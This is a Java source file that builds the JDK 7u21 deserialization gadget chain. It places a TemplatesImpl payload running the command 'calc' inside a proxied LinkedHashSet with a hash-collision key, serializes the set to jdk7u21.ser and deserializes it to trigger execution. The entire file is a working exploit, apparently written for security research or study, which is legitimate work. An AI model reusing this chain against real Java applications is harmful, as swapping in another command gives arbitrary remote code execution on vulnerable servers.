package com.feihong.jre8u20;

import com.feihong.jre8u20.util.Gadgets;
import com.feihong.jre8u20.util.Reflections;
import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.LinkedHashSet;

public class Jdk7u21 {
    public static void main(String[] args) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl("calc");
        String zeroHashCodeStr = "f5a5a608";

        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "foo");

        InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
        Reflections.setFieldValue(tempHandler, "type", Templates.class);
        Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);

        LinkedHashSet set = new LinkedHashSet(); // maintain order
        set.add("anything");
        set.add(templates);
        set.add(proxy);

        Reflections.setFieldValue(templates, "_auxClasses", null);
        Reflections.setFieldValue(templates, "_class", null);

        map.put(zeroHashCodeStr, templates); // swap in real object

        //序列化
        FileOutputStream fous = new FileOutputStream("jdk7u21.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fous);
        oos.writeObject(set);
        oos.close();

        //反序列化
        FileInputStream fis = new FileInputStream("jdk7u21.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);
        ois.readObject();
        ois.close();
    }
}
